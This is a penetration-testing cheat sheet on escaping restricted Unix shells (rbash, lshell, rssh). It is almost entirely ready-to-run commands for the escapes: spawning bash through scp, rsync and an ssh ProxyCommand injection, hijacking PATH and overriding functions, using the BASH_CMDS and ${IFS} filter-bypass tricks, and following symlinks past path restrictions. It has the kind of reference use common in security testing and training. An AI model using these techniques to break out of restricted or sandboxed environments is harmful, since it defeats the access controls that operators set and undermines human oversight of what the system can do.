# 🐚 Restricted Shell Bypass

## 📚 Resources

- [Bypassing Bash Restrictions - Rbash](https://hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)

## 🔐 Bypass Restricted Shell (rbash/lshell/rssh)

### Basic techniques

```bash
# Check restricted shell type
echo $SHELL; echo $PATH

# Command substitution
ls -la $(echo .)
ls -la `echo .`

# Bypass with scp/rsync
scp -S /bin/bash user@host:file .
rsync -e '/bin/bash' user@host:file .
```

```bash
# SSH reconnection (bypass login shell)
ssh localhost $SHELL --noprofile --norc

# SSH ProxyCommand injection
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

### PATH hijacking

```bash
# If $PATH contains writable dir
mkdir /tmp/bin
echo '/bin/bash' > /tmp/bin/ls
chmod +x /tmp/bin/ls
export PATH=/tmp/bin:$PATH
ls  # spawns bash

# Alternative if writable dir but can't write files
export PATH=/bin:/usr/bin:$PATH
```

### Environment variable restoration

```bash
# If bash is restricted but available
BASH_CMDS[a]=/bin/bash;a
export PATH=$PATH:/bin:/usr/bin
```

### Shell Override

```bash
# Function override a builtin/allowed command
function ls { /bin/bash; }; export -f ls

# Binary replacement (if writable dir in $PATH)
cp /bin/bash /path/controlled/ls
export PATH=/path/controlled:$PATH
```

### Tricks

```bash
# ENV
env /bin/bash
env -i /bin/bash

# $0 (current shell)
$0

# Bypass space filters with ${IFS}
ls${IFS}-la${IFS}/etc
/bin${IFS}/bash

# Wildcard
/usr/bin/who*mi
/usr/bin/who?mi
/usr/bin/i[d]
```

## 🔗 Symlink & Procfs Hijacking

```bash
# Bypass path restrictions
ln -s / tmp_link
cd tmp_link/etc/

# Find exposed links
find / -type l -exec readlink -f {} \; 2>/dev/null
```
